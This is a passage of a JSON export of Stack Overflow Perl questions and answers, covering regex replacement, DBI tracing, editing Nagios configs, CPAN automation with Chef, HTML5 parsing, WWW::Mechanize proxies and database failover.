enough, as the value you used isn't accurate: To match letters a-z, you can use a character class instead. To avoid backslashing double quotes, use single quotes:</p>\n\n<pre><code>$find    = 'msg=\"[a-z]\"';\n$replace = 'msg=\"f\"';\n</code></pre>\n\n<p>If you want more than one character, add a <code>+</code> (\"at least once\"):</p>\n\n<pre><code>$find = 'msg=\"[a-z]+\"';\n</code></pre>\n\n<p>Instead of a string, you can create a compiled regular expression with the <code>qr</code> operator:</p>\n\n<pre><code>$find = qr/msg=\"[a-z]+\"/;\n</code></pre>\n"}], "owner": {"reputation": 23, "user_id": 3858383, "user_type": "registered", "accept_rate": 57, "profile_image": "https://graph.facebook.com/100000809471624/picture?type=large", "display_name": "Popescu Emanuel", "link": "https://stackoverflow.com/users/3858383/popescu-emanuel"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 112, "favorite_count": 0, "closed_date": 1457477126, "accepted_answer_id": 35872169, "answer_count": 1, "score": -4, "last_activity_date": 1457471470, "creation_date": 1457452109, "last_edit_date": 1457471470, "question_id": 35871840, "link": "https://stackoverflow.com/questions/35871840/perl-search-and-replace-random-text", "closed_reason": "Needs details or clarity", "title": "perl search and replace random text", "body": "<pre><code>foreach $suitename (@suitename)\n    {\n        foreach $fileLines (@fileLines)\n        {\n            if (index($fileLines, $suitename) != -1) \n            {\n                    $str = $fileLines;\n                    $find = \"msg=\\\"/a-z/\\\"\";\n                    $replace = \"msg=\\\"f\\\"\";\n                    $find = quotemeta $find;\n                    $str =~ s/$find/$replace/g;\n                    print $str; \n            }\n        }\n    }\n</code></pre>\n\n<p>Hi, I want to replace all $find, msg=\"random stuff\" with $replace but I do not manage to do so. what i did was to get all my msg=\"random stuff\" here @msg </p>\n\n<pre><code> for ($i = 0; $i &lt; scalar(@fileLines); $i++){\n        if ($fileLines[$i] =~ /(msg=\".*\") /)\n        {\n         push (@msg,\"$1\\n\");\n\n        }\n} \n</code></pre>\n\n<p>please advice.\nthanks a lot </p>\n"}, {"tags": ["mysql", "perl", "trace", "dbi"], "answers": [{"comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 1, "creation_date": 1457455911, "post_id": 35872086, "comment_id": 59410339, "body": "When I say &quot;you can&#39;t&quot;, I mean there&#39;s no built-in way to do this with DBD::mysql. If it really bothers you, you can filter stderr, e.g. <code>perl myscript.pl 2&gt;&amp;1 | grep -v &#39;&gt;count_params&#39;</code>"}], "tags": [], "owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "is_accepted": true, "score": 2, "last_activity_date": 1457452806, "creation_date": 1457452806, "answer_id": 35872086, "question_id": 35871012, "link": "https://stackoverflow.com/questions/35871012/how-can-i-prevent-statements-from-being-output-multiple-times-when-sql-tracing-i/35872086#35872086", "title": "How can I prevent statements from being output multiple times when SQL tracing is enabled with DBI?", "body": "<blockquote>\n  <p>How can I print every executed SQL statement only once?</p>\n</blockquote>\n\n<p>You can't. <code>count_params</code> and <code>parse_params</code> are internal functions used by DBD::mysql to emulate prepared statements on the client. Both are called when you execute a prepared statement.</p>\n\n<p><a href=\"https://metacpan.org/source/CAPTTOFU/DBD-mysql-4.033/dbdimp.c#L76\" rel=\"nofollow\"><code>count_params</code></a> is called when a statement is prepared and contains the following:</p>\n\n<pre><code>if (DBIc_DBISTATE(imp_xxh)-&gt;debug &gt;= 2)\n  PerlIO_printf(DBIc_LOGPIO(imp_xxh), \"&gt;count_params statement %s\\n\", statement);\n</code></pre>\n\n<p><a href=\"https://metacpan.org/source/CAPTTOFU/DBD-mysql-4.033/dbdimp.c#L521\" rel=\"nofollow\"><code>parse_params</code></a> is called when a statement is executed and contains the following:</p>\n\n<pre><code>if (DBIc_DBISTATE(imp_xxh)-&gt;debug &gt;= 2)\n  PerlIO_printf(DBIc_LOGPIO(imp_xxh), \"&gt;parse_params statement %s\\n\", statement);\n</code></pre>\n\n<p>The logic is the same for both, so it's either all or nothing.</p>\n"}], "owner": {"reputation": 4450, "user_id": 856090, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/fa49a1c90a6af7544d764c5b22ff780d?s=128&d=identicon&r=PG", "display_name": "porton", "link": "https://stackoverflow.com/users/856090/porton"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 41, "favorite_count": 0, "accepted_answer_id": 35872086, "answer_count": 1, "score": 0, "last_activity_date": 1457452806, "creation_date": 1457449859, "last_edit_date": 1457450375, "question_id": 35871012, "link": "https://stackoverflow.com/questions/35871012/how-can-i-prevent-statements-from-being-output-multiple-times-when-sql-tracing-i", "title": "How can I prevent statements from being output multiple times when SQL tracing is enabled with DBI?", "body": "<p>After connecting to a MySQL database using <a href=\"http://metacpan.org/module/DBI\" rel=\"nofollow\"><code>DBI</code></a> I enable <a href=\"https://metacpan.org/pod/DBI#TRACING\" rel=\"nofollow\">trace</a> like this</p>\n\n<pre><code>$dbh-&gt;trace('SQL|DBD');\n</code></pre>\n\n<p>Then after this my SQL queries are printed twice:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>&gt;count_params statement SELECT table1.ID ID, table1.LinkID LinkID, Link.ID Link_ID FROM `table1` `table1` JOIN `table2` `Link` ON `table1`.`LinkID` = `Link`.`ID` WHERE table1.ID = ?\n&gt;parse_params statement SELECT table1.ID ID, table1.LinkID LinkID, Link.ID Link_ID FROM `table1` `table1` JOIN `table2` `Link` ON `table1`.`LinkID` = `Link`.`ID` WHERE table1.ID = ?\n</code></pre>\n\n<p>How can I print every executed SQL statement only once?</p>\n"}, {"tags": ["regex", "perl", "append"], "comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 1, "creation_date": 1457448700, "post_id": 35870412, "comment_id": 59404899, "body": "Please can you add some sample input/output? It&#39;ll make useful answers easier. (E.g. the answer may be something other than a regex pattern replace like that)"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1457449347, "post_id": 35870412, "comment_id": 59405426, "body": "We really need to see the input data"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1457456129, "post_id": 35870412, "comment_id": 59410509, "body": "Is there a reason why my solution didn&#39;t work directly? There is really no need to use a subsitution."}, {"owner": {"reputation": 319, "user_id": 5499166, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a97a92db2bfbaaa2749b756f9665d692?s=128&d=identicon&r=PG&f=1", "display_name": "downtheroad", "link": "https://stackoverflow.com/users/5499166/downtheroad"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1457470016, "post_id": 35870412, "comment_id": 59418686, "body": "@Borodin your solution worked smoothly ;)"}], "answers": [{"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1457450197, "post_id": 35871041, "comment_id": 59406109, "body": "You&#39;re adding a superfluous newline. Did you mean <code>&quot;\\tcheck period...&quot;</code>? and I wouldn&#39;t be too sure that the <code>5</code> in the OP&#39;s pattern is irrelevant!"}], "tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": false, "score": 0, "last_activity_date": 1457449923, "creation_date": 1457449923, "answer_id": 35871041, "question_id": 35870412, "link": "https://stackoverflow.com/questions/35870412/how-can-i-improve-this-regex-append/35871041#35871041", "title": "How can I improve this regex append?", "body": "<p>For starters: <code>*.*</code> doesn't do what you think it does in a regex. </p>\n\n<p>But that aside - I'd probably do it slightly differently:</p>\n\n<pre><code>perl -pe '/normal_check_interval/ &amp;&amp; $_ .= \"\\ncheck_period\\tmy_check_period\\n\"' yourfile\n</code></pre>\n\n<p>Should do the trick - the pattern match will fire when you match the regex, and will append your line to the current line. </p>\n"}, {"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": true, "score": 1, "last_activity_date": 1457449999, "creation_date": 1457449999, "answer_id": 35871065, "question_id": 35870412, "link": "https://stackoverflow.com/questions/35870412/how-can-i-improve-this-regex-append/35871065#35871065", "title": "How can I improve this regex append?", "body": "<p>There's a problem with your regex pattern</p>\n\n<pre><code>^*.*normal_check_interval*.*5*.*$\n</code></pre>\n\n<p>which starts with <code>^*</code> which is <em>zero or more starts of string</em> and will raise the warning</p>\n\n<blockquote>\n  <p>^* matches null string many times in regex</p>\n</blockquote>\n\n<p>There is a similar problem with <code>normal_check_interval*</code>, which will match <code>normal_check_interva</code>, <code>normal_check_interval</code>, <code>normal_check_intervall</code> etc. I doubt if that is what you wanted. Likewise <code>5*</code> will match an empty string, <code>5</code>, <code>55</code>, <code>555</code> etc. so it's pretty much useless</p>\n\n<p>Lets assume you meant</p>\n\n<pre><code>^.*normal_check_interval.*5.*$\n</code></pre>\n\n<p>which matches lines containing <code>normal_check_interval</code> somewhere, and the digit <code>5</code> somewhere later on. That's worryingly non-specific, but rather than a substitution I would just append to the value of <code>$_</code> like this</p>\n\n<pre><code>perl -i -pe '$_ .= \"\\tcheck_period\\t\\t\\tmy_time_period\\n\" if /^\\s+normal_check_interval\\s+5\\b/' file.cfg\n</code></pre>\n"}], "owner": {"reputation": 319, "user_id": 5499166, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a97a92db2bfbaaa2749b756f9665d692?s=128&d=identicon&r=PG&f=1", "display_name": "downtheroad", "link": "https://stackoverflow.com/users/5499166/downtheroad"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 75, "favorite_count": 0, "accepted_answer_id": 35871065, "answer_count": 2, "score": 1, "last_activity_date": 1457452651, "creation_date": 1457448297, "last_edit_date": 1457452651, "question_id": 35870412, "link": "https://stackoverflow.com/questions/35870412/how-can-i-improve-this-regex-append", "title": "How can I improve this regex append?", "body": "<p>I have this perl command to append a new line and works, but, can it be improved?</p>\n\n<pre><code>perl -p -i -e 's/^*.*normal_check_interval*.*5*.*$/\\tnormal_check_interval\\t\\t5\\n\\tcheck_period\\t\\t\\tmy_time_period/' file.cfg\n</code></pre>\n\n<p>For example I think that I can use something like:</p>\n\n<pre><code>perl -p -i -e 's/^*.*normal_check_interval*.*5*.*$/\\t$1\\n\\tcheck_period\\t\\t\\tmy_time_period/' file.cfg\n</code></pre>\n\n<p>but I'm not sure about syntax</p>\n\n<p>thanks in advance</p>\n\n<hr>\n\n<p>EDIT:\n@Sobrique suggestion</p>\n\n<p>It is for edit several nagios cfg files at once.</p>\n\n<p>Example:</p>\n\n<p>Before:</p>\n\n<pre><code>service{\n\n    ...\n    normal_check_interval   5\n    ...\n}\n</code></pre>\n\n<p>After:</p>\n\n<pre><code>service{\n\n    ...\n    normal_check_interval   5\n    check_period            my_time_period\n    ...\n}\n</code></pre>\n\n<hr>\n\n<p>Edit 2:</p>\n\n<p>Based in @Borodin answer I finnaly got this:</p>\n\n<pre><code>perl -p -i -e 's/^(\\s+normal_check_interval\\s+5)/$1\\n\\tcheck_period\\t\\t\\tmy_time_period/' file\n</code></pre>\n"}, {"tags": ["perl", "redis", "automation", "chef-infra", "cpan"], "answers": [{"tags": [], "owner": {"reputation": 43208, "user_id": 78722, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cf611565f0b79abd0b3dc200ad867661?s=128&d=identicon&r=PG", "display_name": "coderanger", "link": "https://stackoverflow.com/users/78722/coderanger"}, "is_accepted": false, "score": 0, "last_activity_date": 1457459695, "creation_date": 1457459695, "answer_id": 35874517, "question_id": 35868941, "link": "https://stackoverflow.com/questions/35868941/how-can-i-automate-redis-perl-library-installation-for-icinga/35874517#35874517", "title": "How can I automate Redis Perl library installation for icinga?", "body": "<p>Use <code>cpan</code> in non-interactive mode:</p>\n\n<pre><code>execute 'cpan -i Redis' do\n  only_if 'cpan -D Redis | grep -e 'Installed:$'\nend\n</code></pre>\n\n<p>Or something like that (double check the guard command, that's just off the top of my head). Or better yet, use the community cookbook (<a href=\"https://github.com/chef-cookbooks/perl\" rel=\"nofollow\">https://github.com/chef-cookbooks/perl</a>) which has a custom resource for this. </p>\n"}], "owner": {"reputation": 317, "user_id": 3155940, "user_type": "registered", "accept_rate": 45, "profile_image": "https://i.stack.imgur.com/o2DAT.png?s=128&g=1", "display_name": "Grin like a Cheshire cat", "link": "https://stackoverflow.com/users/3155940/grin-like-a-cheshire-cat"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 241, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1457459695, "creation_date": 1457444274, "question_id": 35868941, "link": "https://stackoverflow.com/questions/35868941/how-can-i-automate-redis-perl-library-installation-for-icinga", "title": "How can I automate Redis Perl library installation for icinga?", "body": "<p>I want  to automate the redis perl library using chef . I am using <a href=\"https://exchange.nagios.org/directory/Plugins/Databases/check_redis-2Epl/details\" rel=\"nofollow\">Nagios-check</a> for the insatllation , but the problem is while installing you are prompted for answers to various questions. How can I automate this process. The commands I am using manually while installing are :</p>\n\n<pre><code>&gt; cpan (prompts for questions)\n(cpan shell opens)\n&gt; make install\n&gt; install Bundle::CPAN\n&gt; install Redis\n&gt;exit\n</code></pre>\n\n<p>Basically I am looking for all these steps to automate, any help would be appreciated.\nThanks</p>\n"}, {"tags": ["html", "perl", "html-parsing"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1457440969, "post_id": 35867396, "comment_id": 59399073, "body": "What do you want to do with it after it&#39;s parsed?"}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 5, "creation_date": 1457441880, "post_id": 35867396, "comment_id": 59399765, "body": "<a href=\"http://www.perlmonks.org/?node_id=1157066\" rel=\"nofollow noreferrer\">Crossposted</a>."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 2, "creation_date": 1457442129, "post_id": 35867396, "comment_id": 59399951, "body": "For starters, HTML::Tiny is for parsing HTML, not XHTML (&quot;the XML serialization of HTML&quot;)"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 3, "creation_date": 1457443318, "post_id": 35867396, "comment_id": 59400821, "body": "Secondly, the error about the missing <code>&lt;&#47;section&gt;</code> is legitimate. That XML isn&#39;t well-formed because you have an unclosed &quot;section&quot; element. If you used an XML parser as you should, it&#39;ll surely throw an error. If you don&#39;t want it to do that, you should fix the error."}, {"owner": {"reputation": 12075, "user_id": 1137055, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/59d7b43b9eb7d01bd8f7e51febe6053c?s=128&d=identicon&r=PG", "display_name": "dgw", "link": "https://stackoverflow.com/users/1137055/dgw"}, "edited": false, "score": 2, "creation_date": 1457444380, "post_id": 35867396, "comment_id": 59401645, "body": "From <a href=\"http://www.tidyp.com\" rel=\"nofollow noreferrer\">www.tidyp.com</a>: tidyp is a program that can validate your HTML, as well as modify it to be more clean and standard. <b>tidyp does not validate HTML 5</b>."}, {"owner": {"reputation": 6130, "user_id": 299242, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f9bda794bc71267206358bf04ea0a179?s=128&d=identicon&r=PG", "display_name": "mscha", "link": "https://stackoverflow.com/users/299242/mscha"}, "edited": false, "score": 0, "creation_date": 1457454072, "post_id": 35867396, "comment_id": 59408983, "body": "A version of <code>tidy</code> that <i>does</i> support HTML5 can be found at: <a href=\"http://www.html-tidy.org/\" rel=\"nofollow noreferrer\">html-tidy.org</a> .  Note that this is just a command-line tool, without a corresponding Perl module, so you&#39;ll have to change the way you use it."}], "answers": [{"tags": [], "owner": {"reputation": 160, "user_id": 6027771, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d6e6b84a2a791c8e260ed0b95cbac292?s=128&d=identicon&r=PG&f=1", "display_name": "dasgar", "link": "https://stackoverflow.com/users/6027771/dasgar"}, "is_accepted": false, "score": 0, "last_activity_date": 1457501032, "creation_date": 1457501032, "answer_id": 35883548, "question_id": 35867396, "link": "https://stackoverflow.com/questions/35867396/how-to-parse-html5-tags-in-perl/35883548#35883548", "title": "How to parse HTML5 tags in perl?", "body": "<p>According to its documentation, the <a href=\"https://metacpan.org/pod/distribution/HTML-Valid/lib/HTML/Valid.pod\" rel=\"nofollow\">HTML::Valid</a> module is based on www.html-tidy.org and does support HTML5.  And it looks like it will provide you with the line number and column number that you mentioned wanting in this <a href=\"http://perlmonks.org/?node_id=1157068\" rel=\"nofollow\">post</a> at PerlMonks.</p>\n"}], "owner": {"reputation": 118, "user_id": 5055195, "user_type": "registered", "accept_rate": 11, "profile_image": "https://www.gravatar.com/avatar/c972d44652eeadefd86ac423c3d6e629?s=128&d=identicon&r=PG&f=1", "display_name": "Nikhil Ranjan", "link": "https://stackoverflow.com/users/5055195/nikhil-ranjan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 315, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1457516359, "creation_date": 1457440082, "last_edit_date": 1457516359, "question_id": 35867396, "link": "https://stackoverflow.com/questions/35867396/how-to-parse-html5-tags-in-perl", "title": "How to parse HTML5 tags in perl?", "body": "<p>I want parse HTML5 tag?\nWhen i parse it complaint for <code>&lt;section&gt;</code> tag. I don't want it gives error. </p>\n\n<p>Error is \"<code>&lt;/section&gt;</code>\" tag is missing.</p>\n\n<p>My Input is:-</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;html xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/1999/xhtml\" xmlns:m=\"http://www.w3.org/1998/Math/MathML\" xml:lang=\"en\" lang=\"en\"&gt;\n&lt;head&gt;\n&lt;link rel=\"stylesheet\" type=\"text/css\" title=\"day\" href=\"../css/main.css\"/&gt;\n&lt;title&gt;Electric Potential and Electric Potential Energy&lt;/title&gt;\n&lt;meta charset=\"UTF-8\"/&gt;\n&lt;meta name=\"dcterms.conformsTo\" content=\"PXE 1.39 ProductLevelReuse\"/&gt;\n&lt;meta name=\"generator\" content=\"PXE Tools version 1.39.69\"/&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;section class=\"chapter\" &gt;&lt;header&gt;&lt;h1 class=\"title\"&gt;&lt;span class=\"number\"&gt;20&lt;/span&gt; Electric Potential and Electric Potential Energy&lt;/h1&gt;&lt;/header&gt;\n&lt;section class=\"frontmatter\"&gt;\n&lt;section class=\"listgroup\"&gt;&lt;header&gt;&lt;h1 class=\"title\"&gt;Big Ideas&lt;/h1&gt;&lt;/header&gt;\n&lt;ol&gt;\n&lt;li&gt;&lt;p&gt;Electric potential energy is similar to gravitational potential energy.&lt;/p&gt;&lt;/li&gt;\n&lt;/ol&gt;\n&lt;/section&gt;\n&lt;/section&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>My Code is:-</p>\n\n<pre><code>use warnings ;\nuse strict;\nuse HTML::Tidy;\nmy $file_name =\"d:/perl/test.xhtml\";\nundef $/;\nopen xhtml_file, '&lt;:encoding(UTF-8)', \"$file_name\" || die \"no htm file found $!\";\nmy $contents = &lt;xhtml_file&gt;;\nclose (xhtml_file);\n$/ = \"\\n\";\n\nmy $tidy = HTML::Tidy-&gt;new();\n$tidy-&gt;ignore(\n                text =&gt; qr/DOCTYPE/,\n                text =&gt; qr/html/,\n                text =&gt; qr/meta/,\n                text =&gt; qr/header/\n);\n$tidy-&gt;parse( \"foo.html\", $contents );\nfor my $message ( $tidy-&gt;messages )\n    {\n        print $message-&gt;as_string, \"\\n\";\n    }\n</code></pre>\n\n<p>Error Log is:-</p>\n\n<pre><code>foo.html (10:1) Error: &lt;section&gt; is not recognized!\nfoo.html (10:1) Warning: discarding unexpected &lt;section&gt;\nfoo.html (11:1) Error: &lt;section&gt; is not recognized!\nfoo.html (11:1) Warning: discarding unexpected &lt;section&gt;\nfoo.html (12:1) Error: &lt;section&gt; is not recognized!\nfoo.html (12:1) Warning: discarding unexpected &lt;section&gt;\nfoo.html (16:1) Warning: discarding unexpected &lt;/section&gt;\nfoo.html (17:1) Warning: discarding unexpected &lt;/section&gt;\n</code></pre>\n\n<p>How can I solve it?</p>\n"}, {"tags": ["perl", "proxy", "www-mechanize"], "answers": [{"comments": [{"owner": {"reputation": 542, "user_id": 5195778, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/76625f2105397904d15891d665a9a2fc?s=128&d=identicon&r=PG&f=1", "display_name": "JOhnlw009a", "link": "https://stackoverflow.com/users/5195778/johnlw009a"}, "edited": false, "score": 0, "creation_date": 1457443180, "post_id": 35867807, "comment_id": 59400715, "body": "It is all http, also the submitting etc. I also tried your solution, same result :( It looks like that the script just won&#39;t submit at all when using a proxy."}, {"owner": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "reply_to_user": {"reputation": 542, "user_id": 5195778, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/76625f2105397904d15891d665a9a2fc?s=128&d=identicon&r=PG&f=1", "display_name": "JOhnlw009a", "link": "https://stackoverflow.com/users/5195778/johnlw009a"}, "edited": false, "score": 0, "creation_date": 1457451810, "post_id": 35867807, "comment_id": 59407355, "body": "@JOhnlw009a: The script by itself shows no obvious problems apart from the https proxy. Unfortunately the information you currently provide makes it impossible to reproduce the problem. I would recommend that you provide a minimal example to reproduce it. Since you claim that nothing is done with https then you could also eliminate the setting of the https proxy."}, {"owner": {"reputation": 542, "user_id": 5195778, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/76625f2105397904d15891d665a9a2fc?s=128&d=identicon&r=PG&f=1", "display_name": "JOhnlw009a", "link": "https://stackoverflow.com/users/5195778/johnlw009a"}, "edited": false, "score": 0, "creation_date": 1457457663, "post_id": 35867807, "comment_id": 59411554, "body": "I did eliminate it and tracked eveyrthing, it is all really http only. I tested it on a couple servers where TOR/Privoxy is installed. Firewall is also off. The problem would occur for all forms I guess."}], "tags": [], "owner": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "is_accepted": false, "score": 0, "last_activity_date": 1457441213, "creation_date": 1457441213, "answer_id": 35867807, "question_id": 35865858, "link": "https://stackoverflow.com/questions/35865858/perl-wwwmechanize-using-proxy-cannot-submit-form/35867807#35867807", "title": "Perl WWW::Mechanize using Proxy, cannot submit form", "body": "<p>Given the lack of details for the URL of the form target I will guess that this is https while the origin of the form was simple http. First be aware that while LWP (the library underlying WWW::Mechanize) supports a proxy to handle forwarding of https connections it probably does not support proxies which gets accessed by https themselves. But given that you use the same IP:port for http and https proxy my assumption is that you've simply made it typo and it must be like this:</p>\n\n<pre><code>$browser-&gt;proxy('http', 'http://127.0.0.1:8118');    \n$browser-&gt;proxy('https','http://127.0.0.1:8118');\n</code></pre>\n\n<p>Apart from that make sure that the version of LWP you are using is at least 6.06 because earlier versions did had bugs in properly handling https connections when a proxy was configured.</p>\n"}], "owner": {"reputation": 542, "user_id": 5195778, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/76625f2105397904d15891d665a9a2fc?s=128&d=identicon&r=PG&f=1", "display_name": "JOhnlw009a", "link": "https://stackoverflow.com/users/5195778/johnlw009a"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 78, "favorite_count": 1, "answer_count": 1, "score": 0, "last_activity_date": 1457451830, "creation_date": 1457435721, "last_edit_date": 1457451830, "question_id": 35865858, "link": "https://stackoverflow.com/questions/35865858/perl-wwwmechanize-using-proxy-cannot-submit-form", "title": "Perl WWW::Mechanize using Proxy, cannot submit form", "body": "<p>when using WWW::Mechanize and a proxy everything works fine. However, when fetching a form and submit post data, by using the proxy it won't work (timeout). Without proxy everything works fine.\nI got this kind of code:</p>\n\n<pre><code>    $browser = WWW::Mechanize-&gt;new( autocheck =&gt; 1, timeout =&gt; 3 );             \n    $browser-&gt;proxy('http','http://127.0.0.1:8118');    \n    $browser-&gt;proxy('https','https://127.0.0.1:8118');                                      \n    $browser-&gt;get(\"http://someurl.com\");        \n\n    if ( $browser-&gt;success() ) {\n\n        $browser-&gt;form_name('form');\n\n        $browser-&gt;field('a', 1);\n        $browser-&gt;field('b', 2);\n\n        $browser-&gt;field('c', 3);\n\n        # won't submit using proxy\n        $browser-&gt;submit();\n\n  }\n</code></pre>\n\n<p>Does anybody got an solution for this problem?</p>\n"}, {"tags": ["mysql", "perl"], "answers": [{"tags": [], "owner": {"reputation": 8687, "user_id": 325117, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2f0766debb859466aed4b305cc915d8e?s=128&d=identicon&r=PG", "display_name": "Martin Broadhurst", "link": "https://stackoverflow.com/users/325117/martin-broadhurst"}, "is_accepted": false, "score": 2, "last_activity_date": 1457511130, "last_edit_date": 1457511130, "creation_date": 1457434515, "answer_id": 35865471, "question_id": 35865078, "link": "https://stackoverflow.com/questions/35865078/how-do-i-connect-second-database-if-my-first-database-connection-faild-using-eva/35865471#35865471", "title": "How do i connect second database if my first database connection faild using eval in perl", "body": "<pre><code>my $dbh = eval { \n    DBI-&gt;connect(\"DBI:mysql:host=$host1;database=$database\", \n        $user, $password, { 'RaiseError' =&gt; 1 });\n};\nif (!$dbh) {\n    $dbh = DBI-&gt;connect(\"DBI:mysql:host=$host2;database=$database\", \n        $user, $password, { 'RaiseError' =&gt; 1 });\n}\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 5501484, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-eVxlCkR0Fn4/AAAAAAAAAAI/AAAAAAAABL8/wNmx8LKSEjE/photo.jpg?sz=128", "display_name": "Mintu Raj", "link": "https://stackoverflow.com/users/5501484/mintu-raj"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 65, "favorite_count": 0, "closed_date": 1457471297, "answer_count": 1, "score": -8, "last_activity_date": 1457511130, "creation_date": 1457433439, "question_id": 35865078, "link": "https://stackoverflow.com/questions/35865078/how-do-i-connect-second-database-if-my-first-database-connection-faild-using-eva", "closed_reason": "Not suitable for this site", "title": "How do i connect second database if my first database connection faild using eval in perl", "body": "<p>I want connect to database using perl but if my database connection is faild then i want connect to my second database using eval function.  </p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 14052, "user_id": 1004301, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0a6aacd03deb37cb13cbc8b65e454f2b?s=128&d=identicon&r=PG", "display_name": "Lee Duhem", "link": "https://stackoverflow.com/users/1004301/lee-duhem"}, "edited": false, "score": 4, "creation_date": 1457425816, "post_id": 35861919, "comment_id": 59389014, 